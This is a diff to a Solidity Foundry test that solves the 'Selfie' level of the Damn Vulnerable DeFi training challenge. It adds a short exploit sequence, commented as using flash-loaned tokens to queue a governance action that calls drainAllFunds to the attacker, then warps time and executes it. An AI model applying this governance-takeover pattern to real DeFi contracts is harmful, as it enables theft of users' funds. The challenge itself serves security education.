@@ -7,6 +7,7 @@ import "forge-std/Test.sol";
 import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
+import {SelfieAttacker} from "../../../src/Solutions/selfie/SelfieAttacker.sol";
 
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
@@ -17,6 +18,16 @@ contract Selfie is Test {
     SelfiePool internal selfiePool;
     DamnValuableTokenSnapshot internal dvtSnapshot;
     address payable internal attacker;
+
+    struct GovernanceAction {
+        address receiver;
+        bytes data;
+        uint256 weiAmount;
+        uint256 proposedAt;
+        uint256 executedAt;
+    }
+
+    GovernanceAction action;
 
     function setUp() public {
         utils = new Utilities();
@@ -44,10 +55,16 @@ contract Selfie is Test {
     }
 
     function testExploit() public {
+        /* use flash loan token to queueAction a function call of drainAllFunds to attacker */
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        SelfieAttacker selfieAttacker = new SelfieAttacker(address(selfiePool), address(simpleGovernance), attacker);
+        selfieAttacker.attack(TOKENS_IN_POOL);
+        vm.warp(block.timestamp + simpleGovernance.getActionDelay());
+        simpleGovernance.executeAction(selfieAttacker.actionId());
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
